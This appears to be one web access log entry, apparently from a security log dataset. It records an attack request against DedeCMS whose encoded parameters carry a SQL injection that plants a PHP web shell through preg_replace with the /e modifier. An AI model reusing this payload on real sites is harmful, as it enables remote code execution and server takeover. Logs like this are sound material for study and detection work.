"http://www.secrepo.com/plus/mytag_js.php?dopost=saveedit&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=57&arrs2[]=48&arrs2[]=44&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=99&arrs2[]=109&arrs2[]=115&arrs2[]=32&arrs2[]=53&arrs2[]=46&arrs2[]=55&arrs2[]=32&arrs2[]=48&arrs2[]=100&arrs2[]=97&arrs2[]=121&arrs2[]=60&arrs2[]=98&arrs2[]=114&arrs2[]=62&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=44&arrs2[]=32&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=111&arrs2[]=114&arrs2[]=103&arrs2[]=39&arrs2[]=39&arrs2[]=59&arrs2[]=64&arrs2[]=112&arrs2[]=114&arrs2[]=101&arrs2[]=103&arrs2[]=95&arrs2[]=114&arrs2[]=101&arrs2[]=112&arrs2[]=108&arrs2[]=97&arrs2[]=99&arrs2[]=101&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=47&arrs2[]=91&arrs2[]=99&arrs2[]=111&arrs2[]=112&arrs2[]=121&arrs2[]=114&arrs2[]=105&arrs2[]=103&arrs2[]=104&arrs2[]=116&arrs2[]=93&arrs2[]=47&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=36&arrs2[]=95&arrs2[]=82&arrs2[]=69&arrs2[]=81&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=39&arrs2[]=39&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=93&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=114&arrs2[]=114&arrs2[]=111&arrs2[]=114&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
